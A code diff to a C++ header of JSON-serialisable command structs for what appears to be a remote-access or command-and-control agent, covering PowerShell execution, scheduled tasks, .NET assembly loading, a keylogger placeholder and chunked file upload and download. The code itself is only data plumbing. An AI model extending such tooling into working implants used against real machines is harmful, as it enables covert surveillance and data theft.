@@ -1,16 +1,18 @@
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-#pragma once 
+#pragma once
 #include <string>
 #include <rapidjson/document.h>
 #include <rapidjson/stringbuffer.h>
 #include <rapidjson/writer.h>
+#include <cstdint>
 
 struct CommandPowershell
 {
-	std::string commandlet;
-	std::string arguements;
+    std::string commandlet;
+    std::string arguements;
 
-    rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType& allocator) const {
+    rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType &allocator) const
+    {
         rapidjson::Value obj(rapidjson::kObjectType);
 
         rapidjson::Value cmdVal;
@@ -32,7 +34,8 @@ struct CommandWinTask
     std::string username;
     std::string taskName;
 
-    rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType& allocator) const {
+    rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType &allocator) const
+    {
         rapidjson::Value obj(rapidjson::kObjectType);
 
         rapidjson::Value pathVal;
@@ -60,5 +63,67 @@ struct CommandNetAsm
 
 struct CommandKeylogger
 {
+};
+
+// File structs
+struct CommandUploadFile
+{
+    std::string path;
+    std::int64_t offset;
+
+    rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType &allocator) const
+    {
+        rapidjson::Value obj(rapidjson::kObjectType);
+
+        rapidjson::Value pathVal;
+        pathVal.SetString(
+            path.c_str(),
+            static_cast<rapidjson::SizeType>(path.length()),
+            allocator);
+
+        obj.AddMember("Path", pathVal, allocator);
+        obj.AddMember("Offset", offset, allocator);
+
+        return obj;
+    }
+};
+struct CommandDownloadFile
+{
+    std::string path;
+    std::string destinationPath;
+    std::string data;
+    std::int64_t offset;
+    bool final;
+
+    rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType &allocator) const
+    {
+        rapidjson::Value obj(rapidjson::kObjectType);
+
+        rapidjson::Value pathVal;
+        pathVal.SetString(
+            path.c_str(),
+            static_cast<rapidjson::SizeType>(path.length()),
+            allocator);
+
+        rapidjson::Value destinationPathVal;
+        destinationPathVal.SetString(
+            destinationPath.c_str(),
+            static_cast<rapidjson::SizeType>(destinationPath.length()),
+            allocator);
+
+        rapidjson::Value dataVal;
+        dataVal.SetString(
+            data.c_str(),
+            static_cast<rapidjson::SizeType>(data.length()),
+            allocator);
+
+        obj.AddMember("Path", pathVal, allocator);
+        obj.AddMember("DestinationPath", destinationPathVal, allocator);
+        obj.AddMember("Data", dataVal, allocator);
+        obj.AddMember("Offset", offset, allocator);
+        obj.AddMember("Final", final, allocator);
+
+        return obj;
+    }
 };
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
